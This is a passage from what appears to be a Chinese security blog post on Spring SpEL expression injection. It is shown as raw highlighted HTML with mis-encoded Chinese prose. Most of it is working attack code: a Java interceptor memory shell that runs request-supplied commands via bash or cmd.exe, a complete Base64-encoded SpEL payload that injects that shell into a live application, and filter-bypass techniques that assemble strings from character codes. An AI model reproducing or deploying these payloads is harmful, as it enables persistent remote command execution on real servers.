punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"wocaosinidema"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                o <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> c<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> o<span class="token punctuation">;</span>                c<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">ModelAndView</span> modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">postHandle</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> modelAndView<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">afterCompletion</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæœ€ç»ˆçš„payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAADQBAQoAOwCLCABWCwCMAI0IAI4LAI8AkAsAjwCRCACSCACTCgCUAJUKAA4AlggAlwoADgCYBwCZBwCaCACbCACcCgANAJ0IAJ4IAJ8HAKAKAA0AoQoAogCjCgAUAKQIAKUKABQApgoAFACnCgAUAKgKABQAqQoAqgCrCgCqAKwKAKoAqQcArQoAIACuCwA8AK8LADwAsAkAlACxCACyCgCzAKsKALQAtQgAtgsAtwC4BwC5BwC6CwAqALsHALwIAL0KAL4AvwcAwAoAMACuCgDBAMIKAMEAwwcAxAcAxQoANQCuBwDGCgA3AIsLADQAxwgAyAcAyQcAygEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTEluY2VwdG9yTWVtU2hlbGw7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB2J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAC3ByaW50V3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAxgcAywcAzAcAzQcAmgcAzgcAmQcAoAcArQEACkV4Y2VwdGlvbnMBABBNZXRob2RQYXJhbWV0ZXJzAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAM8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAD2V2aWxJbnRlcmNlcHRvcgEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47BwC5BwC6BwDQBwDABwDEBwDFAQAKU291cmNlRmlsZQEAFUluY2VwdG9yTWVtU2hlbGwuamF2YQwAPQA<span class="token operator">+</span><span class="token class-name">BwDLDADRANIBAANnYmsHAMwMANMA1AwA1QDWAQAAAQAHb3MubmFtZQcA1wwA2ADSDADZANoBAAN3aW4MANsA3AEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAD0A3QEACS9iaW4vYmFzaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAN4A3wcA4AwA4QDiDAA9AOMBAA13b2Nhb3NpbmlkZW1hDADkAOUMAOYA5wwA6ADaDADpAD4HAM4MAOoA1AwA6wA</span><span class="token operator">+</span><span class="token class-name">AQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA7AA</span><span class="token operator">+</span><span class="token class-name">DABjAGQMAGcAaAwA7QDuAQAGc3RhYXJ0BwDvBwDwDADxAPIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAPMMAPQA9QEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA9gD3AQA</span><span class="token operator">+</span>b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcBABNhZGFwdGVkSW50ZXJjZXB0b3JzBwD4DAD5APoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HANAMAPsA<span class="token operator">/</span><span class="token class-name">AwA</span><span class="token operator">/</span><span class="token constant">QD</span><span class="token operator">+</span><span class="token class-name">AQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAEEluY2VwdG9yTWVtU2hlbGwMAP8BAAEAAm9rAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAdwcmludGxuAQAFZmx1c2gBAA9wcmludFN0YWNrVHJhY2UBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoAIQA3ADsAAQA8AAAABwABAD0APgABAD8AAAAvAAEAAQAAAAUqtwABsQAAAAIAQAAAAAYAAQAAABIAQQAAAAwAAQAAAAUAQgBDAAAAAQBEAEUAAwA</span><span class="token operator">/</span><span class="token class-name">AAACBQAGAAkAAAC</span><span class="token operator">+</span><span class="token class-name">KxICuQADAgA6BBkExgCwLBIEuQAFAgAsuQAGAQA6BRIHOgcSCLgACbYAChILtgAMmQAiuwANWQa9AA5ZAxIPU1kEEhBTWQUZBFO3ABE6BqcAH7sADVkGvQAOWQMSElNZBBITU1kFGQRTtwAROga7ABRZGQa2ABW2ABYSBLcAFxIYtgAZOggZCLYAGpkACxkItgAbpwAFGQc6BxkItgAcGQUZB7YAHRkFtgAeGQW2AB</span><span class="token operator">+</span>nAAo6BRkFtgAhA6wErAABAA8AsACzACAAAwBAAAAATgATAAAALQAKAC4ADwAwABcAMQAfADMAIwA0ADMANQBSADcAbgA5AIYAOgCaADsAnwA8AKYAPQCrAD4AsABBALMAPwC1AEAAugBCALwARABBAAAAcAALAE8AAwBGAEcABgAfAJEASABJAAUAbgBCAEYARwAGACMAjQBKAEsABwCGACoATABNAAgAtQAFAE4ATwAFAAAAvgBCAEMAAAAAAL4AUABRAAEAAAC<span class="token operator">+</span><span class="token class-name">AFIAUwACAAAAvgBUAFUAAwAKALQAVgBLAAQAVwAAAGMAB</span><span class="token operator">/</span><span class="token number">8</span>AUgAIBwBYBwBZBwBaBwBbBwBcBwBdAAcAXAAA<span class="token operator">/</span>wAbAAgHAFgHAFkHAFoHAFsHAFwHAF0HAF4HAFwAAPwAJwcAX0EHAFz<span class="token operator">/</span><span class="token class-name">ABoABQcAWAcAWQcAWgcAWwcAXAABBwBgBgEAYQAAAAQAAQAgAGIAAAANAwBQAAAAUgAAAFQAAAABAGMAZAADAD8AAABgAAUABQAAAAoqKywtGQS3ACKxAAAAAgBAAAAACgACAAAASQAJAEoAQQAAADQABQAAAAoAQgBDAAAAAAAKAFAAUQABAAAACgBSAFMAAgAAAAoAVABVAAMAAAAKAGUAZgAEAGEAAAAEAAEAIABiAAAAEQQAUAAAAFIAAABUAAAAZQAAAAEAZwBoAAMAPwAAAGAABQAFAAAACiorLC0ZBLcAI7EAAAACAEAAAAAKAAIAAABOAAkATwBBAAAANAAFAAAACgBCAEMAAAAAAAoAUABRAAEAAAAKAFIAUwACAAAACgBUAFUAAwAAAAoAaQBPAAQAYQAAAAQAAQAgAGIAAAARBABQAAAAUgAAAFQAAABpAAAAAQBqAGsAAwA</span><span class="token operator">/</span><span class="token class-name">AAAAPwAAAAMAAAABsQAAAAIAQAAAAAYAAQAAAFQAQQAAACAAAwAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQBuAG8AAgBhAAAABAABAHAAYgAAAAkCAGwAAABuAAAAAQBqAHEAAwA</span><span class="token operator">/</span><span class="token class-name">AAAASQAAAAQAAAABsQAAAAIAQAAAAAYAAQAAAFkAQQAAACoABAAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQByAHMAAgAAAAEAVAB0AAMAYQAAAAQAAQBwAGIAAAANAwBsAAAAcgAAAFQAAAAIAHUAPgABAD8AAAFpAAMABQAAAGqyACQSJbYAJrgAJxIoA7kAKQMAwAAqSyoSK7kALAIAwAArTAFNEi0SLrYAL02nAAhOLbYAMSwEtgAyAU4sK7YAM8AANE6nAAo6BBkEtgA2uwA3WbcAODoELRkEuQA5AgBXsgAkEjq2ACaxAAIAJQAtADAAMAA8AEUASAA1AAQAQAAAAEoAEgAAABUACAAWABcAFwAjABgAJQAaAC0AHQAwABsAMQAcADUAHgA6AB8APAAhAEUAJABIACIASgAjAE8AJQBYACYAYQAnAGkAKABBAAAASAAHADEABABOAHYAAwBKAAUATgB3AAQAFwBSAHgAeQAAACMARgB6AHsAAQAlAEQAfAB9AAIAPAAtAH4AfwADAFgAEQCAAEMABACBAAAADAABADwALQB</span><span class="token operator">+</span><span class="token class-name">AIIAAwBXAAAALQAE</span><span class="token operator">/</span>wAwAAMHAIMHAIQHAIUAAQcAhgT<span class="token operator">/</span><span class="token class-name">ABIABAcAgwcAhAcAhQcAhwABBwCIBgABAIkAAAACAIo</span><span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719225734878.png" alt="image-20240719225734878"></p><hr><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="å­—ç¬¦ä¸²æ›¿æ¢"><a href="#å­—ç¬¦ä¸²æ›¿æ¢" class="headerlink" title="å­—ç¬¦ä¸²æ›¿æ¢"></a>å­—ç¬¦ä¸²æ›¿æ¢</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>T(String).getName</code>è¿”å›çš„æ˜¯<code>java.lang.String</code>ï¼Œç„¶åç”¨replaceæ›¿æ¢è·å–æƒ³è¦çš„å­—ç¬¦ä¸²ï¼Œè¿™ç§æ¯”è¾ƒéº»çƒ¦ã€‚</p><p>è¿˜æœ‰ä¸€ç§å°±æ˜¯ç›´æ¥ä½¿ç”¨ç±»ä¼¼<code>chr</code>å‡½æ•°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¤–éƒ¨å¯¹è±¡request"><a href="#å¤–éƒ¨å¯¹è±¡request" class="headerlink" title="å¤–éƒ¨å¯¹è±¡request"></a>å¤–éƒ¨å¯¹è±¡request</h3><p>å‡å¦‚ä¸Šä¸‹æ–‡ä¸­æœ‰requestå¯¹è±¡çš„è¯å°±ä¹Ÿæœ‰å‡ ç§æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//request.getMethod()ä¸ºPOST</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token 